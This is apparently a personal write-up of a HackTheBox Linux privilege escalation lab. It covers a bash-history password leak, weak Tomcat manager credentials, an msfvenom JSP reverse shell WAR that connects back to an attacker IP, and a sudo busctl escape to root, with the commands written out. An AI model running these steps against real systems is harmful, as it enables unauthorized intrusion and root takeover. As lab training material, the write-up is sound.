# Day31 - Linux Local Privilege Escalation (HTB Skill Assessment)

- **Platform**: HackTheBox  
- **Category**: Linux / Privilege Escalation  
- **Difficulty**: Medium  
- **Date**: 2025-05-31  
- **Tools Used**: SSH, bash history, Tomcat exploitation, msfvenom, sudo misconfigurations  

---

## Summary
This assessment simulated a penetration test against a Linux web server. Starting with a **low-privileged SSH account**, I escalated through multiple misconfigurations and flaws until achieving **root access**, collecting five flags along the way.  

---

## 🔑 Privilege Escalation Chain
```
[Low-Privileged User] 
     ↓  (flag1 in .config)  
[Bash History Leak → Barry creds] 
     ↓  (flag2)  
[World-Readable Logs] 
     ↓  (flag3)  
[Tomcat Misconfig → WAR Reverse Shell] 
     ↓  (flag4)  
[Sudo busctl Misuse → Root Shell] 
     ↓  (flag5 in /root)
```

---

## Enumeration
- Logged in as the provided low-privileged user via SSH.  
- Observed file system layout and accessible directories with:  
  ```bash
  ls -la
  ```  

---

## Exploitation

### Flag 1 — User Config Files
- Located `flag1.txt` in the user’s `.config` directory.  
- Readable directly with the initial account.  

---

### Flag 2 — Bash History Disclosure
- Found `.bash_history` in user *barry*’s home directory.  
- Exposed Barry’s plaintext password.  
- Used the credentials to switch user:  
  ```bash
  su barry
  ```  
- Retrieved `flag2.txt`.  

---

### Flag 3 — Log Files
- Navigated to `/var/log`.  
- `flag3.txt` was stored among log files, world-readable.  

---

### Flag 4 — Tomcat Misconfiguration
- Noticed Tomcat service running on port 8080.  
- Checked `/etc/tomcat9/tomcat-users.xml` → contained weak credentials.  
- Logged into Tomcat Manager with exposed creds.  
- Generated a reverse shell payload with msfvenom:  
  ```bash
  msfvenom -p java/jsp_shell_reverse_tcp LHOST=<attacker-ip> LPORT=9443 -f war -o back.war
  ```  
- Uploaded and executed the WAR file.  
- Established a shell via netcat listener, and found `flag4.txt`.  

---

### Flag 5 — Privilege Escalation to Root
- Upgraded shell for stability:  
  ```bash
  python3 -c 'import pty; pty.spawn("/bin/bash")'
  ```  
- Checked sudo privileges with:  
  ```bash
  sudo -l
  ```  
- Discovered ability to run `busctl` as root without a password.  
- Exploited `busctl` escape to root shell:  
  ```bash
  sudo busctl --show-machine
  !/bin/bash
  ```  
- Verified with `id`, accessed `/root`, and retrieved `flag5.txt`.  

- **Final Flag:** `HTB{REDACTED}`  

---

## Lessons Learned
- Always check hidden files (`.config`, `.bash_history`) — they frequently expose sensitive data.  
- Misconfigured Tomcat servers are a common enterprise weakness; uploading malicious WAR files provides straightforward RCE.  
- Sudo misconfigurations with tools like `busctl` can be directly escalated to root.  
- Escalation often comes from **layered small wins**: history leaks → service configs → privilege misuse.  
